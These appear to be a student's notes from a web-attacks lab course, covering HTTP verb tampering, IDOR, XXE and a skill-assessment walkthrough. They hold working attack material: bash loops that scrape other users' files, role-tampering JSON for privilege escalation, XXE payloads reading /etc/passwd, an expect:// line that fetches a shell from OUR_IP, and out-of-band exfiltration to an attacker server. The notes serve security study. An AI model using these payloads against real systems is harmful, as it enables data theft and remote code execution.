
# HTTP Verb Tampering

HTTP has in total [9 different verbs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods), other than `GET` and `POST`, here are some commonly ones:

|Verb|Description|
|---|---|
|`HEAD`|Identical to a GET request, but its response only contains the `headers`, without the response body|
|`PUT`|Writes the request payload to the specified location|
|`DELETE`|Deletes the resource at the specified location|
|`OPTIONS`|Shows different options accepted by a web server, like accepted HTTP verbs|
|`PATCH`|Apply partial modifications to the resource at the specified location|

The `Insecure Configurations` comes when webserver are configured to require autehtnication limited to a single/some HTTP verbs like this:

```xml
<Limit GET POST>
    Require valid-user
</Limit
```

If we used a `HEAD` verb for example, we could bypass the authentication.

Another exploit would be in `Insecure Coding`. Coding must be consistent, so if the web developer applies specific filters to mitigate vulnerabilities while not coverin all HTTP methods, this wil be vulnerable. For example

```php
$pattern = "/^[A-Za-z\s]+$/";

if(preg_match($pattern, $_GET["code"])) {
    $query = "Select * from ports where port_code like '%" . $_REQUEST["code"] . "%'";
    ...SNIP...
}
```

This code is only appling the filter on the `GET` parameter. However, when the query is executed, the `$_REQUEST` parameter is being used, which may also contain `POST` parameters, leading to an inconsistency.

Generally when we send a request (ex: an authentication form) we can try to change the HTTP verb. A way to know what are the verbs allowed is to send a request with the `OPTIONS` verb:

```shell-session
curl -i -X OPTIONS http://SERVER_IP:PORT/

HTTP/1.1 200 OK
Date: 
Server: Apache/2.4.41 (Ubuntu)
Allow: POST,OPTIONS,HEAD,GET
Content-Length: 0
Content-Type: httpd/unix-directory
```

If you for example send a `HEAD` request to the authentication form, if it's vulnerable you could bypass it.

The same thing can be applied when there are `security filters`.
If you are trying to perform an action and get `Malicious request denied` or simply `Request denied` it means there's some type of blacklisting/filtering. To bypass that you can try to change the request `for example from a POST to a GET request` and try again. If the website is vulnerable, you will bypass it, even if you use "blacklisted" characters (simply that HTTP verb is not being filtered).

For `Prevention` check course material.

# IDOR
`Insecure Direct Object References (IDOR)` occur when a web application exposes a direct reference to an object, like a file or a database resource, which the end-user can directly control to obtain access to other similar objects
For example, if users request access to a file they recently uploaded, they may get a link to it such as (`download.php?file_id=123`). what would happen if we tried to access another file (which may not belong to us) with (`download.php?file_id=124`)? If the web application does not have a proper access control system on the back-end, we may be able to access any file by sending a request with its `file_id`.
The main takeaway is that `an IDOR vulnerability mainly exists due to the lack of an access control on the back-end`.

We can identify `IDOR` in `URL Parameters & APIs`, `AJAX Calls`, `Hashing/encoding data` and `In Comparison of User Roles`.

In `URL parameters & APIs` we could find something like this: 

```shell-session
http://SERVER_IP:PORT/documents.php?uid=1
```

If we try to modify the `uid` parameter, we can access other users's files.
For example if user with `uid=1` has these two files:
```html
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
```

The user with `uid=2` will have this files: 
```html
/documents/Invoice_2_08_2020.pdf
/documents/Report_2_12_2020.pdf
```

And so on...
We can extract all these files with `Burp Intruder` or with `bash`: 

```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

It's possible that indexes are used but are `encoded` or `hashed`. For example, if we see something like this: 

```php
contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
```

We don't know what this mean, we can make a strong guess by trying to use `md5sum` with the number `1` like this:

```shell-session
Poiint@htb[/htb]$ echo -n 1 | md5sum

c4ca4238a0b923820dcc509a6f75849b -
```

the flag `-n` is used to take out the `new-line` character. Unluckily these two doesn't match. A place where we could look is `js` scripts. If the hasing/encoding is handled client-side, it means we can access and see what is doing:

```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

We see that our paramater is being first encoded in `base64` with `btoa` function and then is hashed with the `CryptoJS.MD5` algorithm. Now we know how these files are transformed and we can perform the same attack we did before.

```shell-session
Poiint@htb[/htb]$ echo -n 1 | base64 -w 0 | md5sum

cdd96d3cc73d1dbdaffa03cc6cd7339b -
```

In this cases we would want to enumerate all the files. We can do that with bash scripting. First we need to enumerate the md5 hash of a range of IDs like this:

```shell-session
Poiint@htb[/htb]$ for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
```

Then we can use `cURL` to get these files:

```bash
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

By running this script we will enumerate all the files with IDs from 1 to 10.

When dealing with `APIs`, we should look for the requests. If we are trying to modify something in our profile, then a `PUT` request with `JSON` parameter will be issued: 

`/profile/api.php/profile/1`

```json
{
    "uid": 1,
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "employee",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
}
```

We can now do a few things. The first is we can change the ID in the API endpoint and in the JSON data in order to obtain another user's informations. Another thing we can do is change the `role` of the user. Finally, we can try to create a new user by changing the `http verb` from a `PUT` to a `POST`.  If we get an error that only admins can do that, if we can change our privileges, maybe we can perform this. If we change our role to `admin` we could get `invalid role`, so this means we need to enumerate (other profiles for example) to see if someone has a special role such as admin.

If we find a user that as a role similar to `web_admin, admin or administrator`, we can use that role and change our role to this specific one. Also, give a look into the `Cookie` parameter. In this case we have `Cookie: role=employee`. This means that changing the cookie to a fully priviliged one could give us a privileged session where we can execute all the type of commands. So let's say we found an user that has `web_admin` role, we can try to change our role to this one and also the cookie:

```json
{
    "uid": "1",
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "web_admin",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
}
```

If we try the same operation with `POST` request, we succesfully created a new user, meaning that we escalated our privileges. Now we can perform these higher functionality inside the webserver.
We could create a script that changes the email to a ours and proceed to change the password (reset password), or a script that changes all emails to random ones, etc.

For `prevention` check course material.

# XXE
`XML External Entity (XXE) Injection` vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, which may allow us to use XML features to perform malicious actions.

NB: there's a part on XML. Go check it if u dont remember it.

XXE works by using `XML Entities` in `XML DTD (Document Type Definition)`.
First of all, we need to find our injection point. We need to find a request where XML data is being sent. Once we find it (for example a contact form) we can analyze the response. This attack works if the response give us back a parameter that we sent (very similar to XSS!).
Now we can add some XML entities in the start of the XML code (just after the XML declaration) with some code like this:

```
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

And in the "vulnerable"(the one that we see in the response) parameter, we can write `&company;`.
If it's vulnerable, we will see, instead of `&company;`, `Inlane Freight`. This means we can proceede to a better attack like reading `passwd`:

```
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

We can also read source code, but since the output contains illegal characters (it contains XML's special characters such as `<, >, &`).
To bypass this, we can use the `php filters` and encode the content of the file in base64:

```
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

We can also obtain `Remote Code Execution` by using the `expect` filter, if enabled. We can create a simple php shell and start a python3 server, then in the XML:

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

NB: we used the same techniques for `Command Injection` like the `${IFS}` to replace spaces and so on. In modern php server this is not very effective since the `expect` module is not enabled or installed by default.

Another DoS attack is displayed, but i will not write it here.

Now we can perform some `Advanced File Disclosure`.
We can use this technique for extract every type of file in the system. To output data that is not conform to the XML format, we can use the `CDATA` tag:

```
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

This does not simply work by just referencing the `&joined;` entity because `XML prevents joining internal and external entities`.
To bypass this, we can create a file named `xxe.dtd` with this data:
```xml
<!ENTITY joined "%begin;%file;%end;">
```

And start a python server
```shell-session
Poiint@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
Poiint@htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

After that, we can inject this code into the XML file:
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

NB: remember that `<!-- -->` are comments!

Another thing we can do is based on `Error Based XXE` where we trigger an error for example by referencing a non existing entity like this:

```
...SNIP...
<email>
&NonExistingEntity;
</email>
...SNIP...
```

Since we did not create `&NonExistingEntity;`, this wil trigger an error. This attack is similar to the one we did before. We need to create again a `xxe.dtd` file with this data:

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

And inject this code in the XML request:

```
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

(IIRC you can remove all the tags, such as  `<root>, <email>` ecc..  since we are voluntary triggering an error). If vulnerable it will throw an error alongside the file we requested.

Finally, the last technique is `Blind Data Exfiltration` or `Out-of-band Data Exfiltration`.
Like before, we create a `xxe.dtd` file with this data:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

AND a php file called `index.php` with this data:

```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

Now we can start the PHP server like this:

```shell-session
Poiint@htb[/htb]$ php -S 0.0.0.0:8000
```

Now in the XML request, we will use a payload similar to the `Error Based` one. Like this:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

Basically, the `%remote` will call our `xxe.dtd` file, which will call the `%oob` entity. This entity will make a request to our server (the PHP server we started) with the `content` parameter set to the `%file` entity, which is the `etc/passwd` file encoded in base64 (and will be decoded by the `index.php` file). Finally, if we look into our PHP server, we can see something like this:

```shell-session
PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
10.10.14.16:46256 Accepted
10.10.14.16:46256 [200]: (null) /xxe.dtd
10.10.14.16:46256 Closing
10.10.14.16:46258 Accepted

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...SNIP...
```

Extra, we can use the [XXEinjector](https://github.com/enjoiz/XXEinjector) tool. We can clone it. It works by copying the XML request into a file, and deleteing the whole XML data (except for the XML declaration) and by injecting the `XXEINJECT` keyword. Below an example:

```http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

We can then run the script with these flags.
- `--host/httpport`: Our IP and port;
- `--file`: the file we wrote above (the XML request);
- `--path`: the file we want to read in the server (for example /etc/passwd);
- `--oob/--phpfilter`: needed to specify the `Out Of Band` attack and `Use of PHP filters`.

The tool will save the output in a specific log, for example (i guess it will be written in the output):

```shell-session
Poiint@htb[/htb]$ cat Logs/10.129.201.94/etc/passwd.log 
```

For `Prevention` check course material.

# Skill Assessment

You login with creds given in the question. Once you are in, you basically can click on your profile and change your password. Doing the first thing, and intercepting with burpsuite, does a tricky behaviour, which first load the page, and secondly load the user information. So you need to intercpet the second requests that are sent to an API endpoint. Since the id of the user is in the URL, we can specify another ID, resulting in `IDOR`. I fuzzed the first 100 users (in total there were 100) and the information where the username, the full name, and the company. By looking at each request, i found that the user that has ID = 52 has a company name = "Administator". This was interesting. 
Once we found a user that could be used to privilege escalation, i poked a bit with the changing password feature. Again this feature has a strange behaviour, because before calling the API endpoint, it first makes a request to retrieve a special "Token". Once the token is obtained, it then makes a request to change the password.
Also another thing that i noticed is the cookie, which was settled to the ID of the user (for example, if user with id=1 made the request, the cookie would have cookie=1).
So my first thought was to change the password to the administrator by first obtaining his token. Once obtained, i tried to change the password, (specifying also the cookie=52) but this was not succesfull. It said something like `Permission Denied` which was weird.
So i did a thing, i tried to change the password of our user with the token of the administrato and it said `Invalid Token`. So i fuzzed the whole 100 users with a wrong token to see if i would receive `Invalid Token` or `Permission Denied`. For all the 99 user i got `Permission Denied` and only for mine i got `Invalid Token`. 
I was a bit lost because i didn't know what to do since i was pretty sure this was the way, so another thing that came to my mind is maybe we can bypass that filtering changing the HTTP verb? From a POST to a GET? I did so and luckily it worked! I was able to change the administrator password. 
Once logged as the administrator, i had the possibility to create events. I created a dummy one and intercepted the request with burp. I found that the data was sent over XML, so my first thing was to do a XXE attack. As we said for XXE we need to find what parameter is outputted in the request, in this case was the "Event  Name". So basically i did a simple techique to read the "/flag.php" file using php filters. This part was really easy and straightforward.